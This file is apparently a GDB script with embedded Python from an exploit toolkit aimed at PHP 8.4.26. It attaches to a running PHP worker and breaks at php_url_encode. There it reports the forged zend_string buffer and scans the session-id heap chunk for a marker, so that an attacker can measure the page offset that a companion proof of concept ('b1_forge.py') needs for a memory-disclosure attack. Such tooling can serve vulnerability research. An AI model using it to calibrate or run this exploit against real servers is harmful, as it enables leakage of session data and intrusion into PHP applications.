# b1_page_finder.gdb - which page of which chunk does the forged value actually occupy?
#
# The disclosure geometry is expressed as a page: `G:<pages>:<p>` in b1_forge.py says "fill this many
# pages and put the forged header on page p". On 8.4.26 that page is 0x137. It is a layout constant, so
# it has to be measured per build, and the way to measure it is to stop at the moment the encoder reads
# the forged string and ask the process where that string is.
#
# Unlike b_tail_live.gdb this breakpoint carries no argument condition, so it also fires when the
# geometry is wrong - which is exactly the case it is needed for. Attach it *after* the arming request,
# so the first hit belongs to the disclosure request:
#
#   sudo gdb -q -batch -p <worker> -x gdb/b1_page_finder.gdb &
#   python3 poc/b1_forge.py --url ... --spec ...      # the request that hits the breakpoint
#
# It prints, at the read:
#   $x0  the buffer the encoder is about to read (the forged zend_string data)
#   $x1  its length (0xc8000 when the forge landed)
#   which chunk $x0 is in, and whether that is the chunk holding PS(id)
#   every page of the PS(id) chunk that still carries the value marker
set pagination off
set confirm off
set width 0

python
import gdb

CHUNK = 0x200000
PS_ID = 0x10               # php_session_globals.id
MARKER = bytes.fromhex("2f39394242424242")   # "/99BBBBB", the default data-head of the forge


def q(inf, addr):
    return int.from_bytes(inf.read_memory(addr, 8).tobytes(), "little")


class PageFinder(gdb.Breakpoint):
    def stop(self):
        inf = gdb.selected_inferior()
        x0 = int(gdb.parse_and_eval("$x0"))
        x1 = int(gdb.parse_and_eval("$x1"))
        try:
            ps = int(gdb.parse_and_eval("(unsigned long)&ps_globals"))
            psid = q(inf, ps + PS_ID)
        except Exception:
            psid = 0

        print("[pf] encoder read: buf=%#x len=%#x  (page %#x of its chunk)"
              % (x0, x1, (x0 & (CHUNK - 1)) >> 12))
        if psid:
            idchunk = psid & ~(CHUNK - 1)
            print("[pf] PS(id)=%#x idchunk=%#x  buf_chunk=%#x  same_chunk=%s"
                  % (psid, idchunk, x0 & ~(CHUNK - 1), (x0 & ~(CHUNK - 1)) == idchunk))
            try:
                blob = inf.read_memory(idchunk, CHUNK).tobytes()
            except Exception:
                blob = b""
            pages = [off >> 12 for off in range(0, len(blob) - len(MARKER), 8)
                     if blob[off:off + len(MARKER)] == MARKER]
            if pages:
                print("[pf] marker pages in the id chunk: first=%#x last=%#x count=%d"
                      % (pages[0], pages[-1], len(pages)))
                print("[pf]   all: %s" % " ".join("%#x" % p for p in pages[:32]))
            else:
                print("[pf] marker not found in the id chunk (value is elsewhere)")
        return True


PageFinder("php_url_encode", internal=False)
end

continue
